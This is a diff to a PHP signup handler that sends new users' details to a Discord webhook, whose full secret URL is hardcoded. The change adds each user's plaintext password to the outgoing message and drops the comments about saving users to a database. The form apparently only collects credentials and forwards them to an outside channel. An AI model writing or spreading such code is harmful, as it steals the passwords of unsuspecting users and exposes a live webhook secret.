@@ -6,7 +6,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     
     // Save user information to Discord channel using webhook
     $webhookURL = "https://discord.com/api/webhooks/1214681961323565067/iAHsNoCSrBAtxHCwBryAPlG2VicENLRlJOgX2U2wNMotI0C8ei95JObDTGUqF8ZrrWW2";
-    $message = "New user signup:\nEmail: $email\nUsername: $username";
+    $message = "New user signup:\nEmail: $email\nUsername: $username\nPassword: $password";
     
     $data = array('content' => $message);
     $options = array(
@@ -19,15 +19,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $context = stream_context_create($options);
     file_get_contents($webhookURL, false, $context);
     
-    // Additional logic to save user data to your database or file
-    // For example, you can use PDO to interact with a MySQL database
-    // Insert the $email, $username, and $password into your users table
-    
     // Return success message to the client
     echo json_encode(['success' => true]);
 } else {
     // Redirect or handle unauthorized access
-    header("Location: index.php");
+    header("Location: index.html");
     exit();
 }
 ?>
